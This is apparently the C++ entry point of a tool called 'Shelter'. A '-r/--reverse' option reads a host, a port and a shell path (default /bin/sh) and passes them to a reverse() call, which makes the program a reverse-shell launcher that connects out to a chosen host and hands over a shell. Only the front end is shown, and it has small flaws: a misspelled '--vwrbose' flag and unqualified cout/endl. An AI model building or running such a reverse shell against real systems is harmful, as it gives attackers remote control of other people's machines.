#include <shelter.hpp>
#include <argh.h>
#include <string>
#include <boost/lexical_cast.hpp>

using std::string;
using namespace argh;

int main(int argc, char* argv[])
{
    Shelter app;
    parser cmdl;
    cmdl.parse(argc, argv, parser::PREFER_PARAM_FOR_UNREG_OPTION);
    app.showBanner();

    if(cmdl[{"-v", "--vwrbose"}]) app.verbose = true;
    if(cmdl[{"-r", "--reverse"}]) {
        string host = "127.0.0.1", shell = "/bin/sh";
        unsigned short port = 40141;

        for(auto& param : cmdl.params()) {
            if(param.first == "h") host = param.second;
            else if(param.first == "s") shell = param.second;
            else if(param.first == "p") {
                port = boost::lexical_cast<unsigned short>(param.second);
            }
        }
        if(app.verbose) cout << host << ":" << port << " << " << shell << endl;
        app.reverse(host, port, shell);
    }
    else {
        app.showHelp();
    }
    return 0;
}
